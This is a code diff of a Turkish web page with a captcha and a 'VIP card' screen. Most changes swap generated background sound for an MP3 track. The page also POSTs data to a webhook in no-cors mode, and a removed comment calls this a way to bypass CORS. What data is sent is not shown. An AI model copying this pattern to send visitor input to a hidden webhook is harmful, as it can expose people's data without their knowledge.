@@ -223,7 +223,7 @@
 
 <div class="kart">
   <div class="banner" id="bannerAlani">
-    <button type="button" class="muzik-btn" id="muzikKontrol">🔇 Gizemli Ses: Kapalı</button>
+    <button type="button" class="muzik-btn" id="muzikKontrol">🔇 Müzik: Kapalı</button>
     <div class="ikon" id="ustIkon">🛡️</div>
   </div>
 
@@ -320,7 +320,8 @@
   </div>
 </div>
 
-<audio id="ozelMuzik" loop src=""></audio>
+<!-- Yüklediğin Basslı Phonk Müzik Dosyası -->
+<audio id="ozelMuzik" loop src="muzik.mp3"></audio>
 
 <script>
   const efektCtx = new (window.AudioContext || window.webkitAudioContext)();
@@ -381,50 +382,18 @@
   const dogruCevap = sayi1 + sayi2;
   document.getElementById('captchaSoru').innerText = `🤖 Doğrulama: ${sayi1} + ${sayi2} = ?`;
 
-  let bgAudioCtx = null;
-  let sesAcik = false;
-  let osc1, osc2, gainNode;
   const ozelMuzik = document.getElementById('ozelMuzik');
   const muzikBtn = document.getElementById('muzikKontrol');
+  let sesAcik = false;
 
-  function gizemliSesBaslat() {
-    if (ozelMuzik.getAttribute('src') !== "") {
-      ozelMuzik.volume = 0.35;
-      ozelMuzik.play();
-      return;
-    }
-    bgAudioCtx = new (window.AudioContext || window.webkitAudioContext)();
-    osc1 = bgAudioCtx.createOscillator();
-    osc2 = bgAudioCtx.createOscillator();
-    gainNode = bgAudioCtx.createGain();
-
-    osc1.type = 'sine';
-    osc1.frequency.setValueAtTime(65.41, bgAudioCtx.currentTime);
-    osc2.type = 'triangle';
-    osc2.frequency.setValueAtTime(98.00, bgAudioCtx.currentTime);
-    gainNode.gain.setValueAtTime(0.06, bgAudioCtx.currentTime);
-
-    osc1.connect(gainNode);
-    osc2.connect(gainNode);
-    gainNode.connect(bgAudioCtx.destination);
-
-    osc1.start();
-    osc2.start();
-  }
-
-  function gizemliSesDurdur() {
-    if (ozelMuzik.getAttribute('src') !== "") {
-      ozelMuzik.pause();
-      return;
-    }
-    if (osc1) { osc1.stop(); osc2.stop(); bgAudioCtx.close(); }
-  }
-
+  // Sayfaya ilk tıklandığında müzik otomatik başlar
   document.body.addEventListener('click', function ilkTiklama() {
     if (!sesAcik) {
-      gizemliSesBaslat();
-      sesAcik = true;
-      muzikBtn.innerText = "🔊 Gizemli Ses: Açık";
+      ozelMuzik.volume = 0.4;
+      ozelMuzik.play().then(() => {
+        sesAcik = true;
+        muzikBtn.innerText = "🔊 Müzik: Açık";
+      }).catch(() => {});
     }
     document.body.removeEventListener('click', ilkTiklama);
   });
@@ -433,13 +402,14 @@
     e.stopPropagation();
     tikSesiCal();
     if (sesAcik) {
-      gizemliSesDurdur();
+      ozelMuzik.pause();
       sesAcik = false;
-      muzikBtn.innerText = "🔇 Gizemli Ses: Kapalı";
+      muzikBtn.innerText = "🔇 Müzik: Kapalı";
     } else {
-      gizemliSesBaslat();
+      ozelMuzik.volume = 0.4;
+      ozelMuzik.play();
       sesAcik = true;
-      muzikBtn.innerText = "🔊 Gizemli Ses: Açık";
+      muzikBtn.innerText = "🔊 Müzik: Açık";
     }
   });
 
@@ -512,7 +482,6 @@
       }]
     };
 
-    // no-cors ile CORS engelini bypass edip direkt VIP kart ekranını açar
     fetch(webhookURL, {
       method: "POST",
       mode: "no-cors",
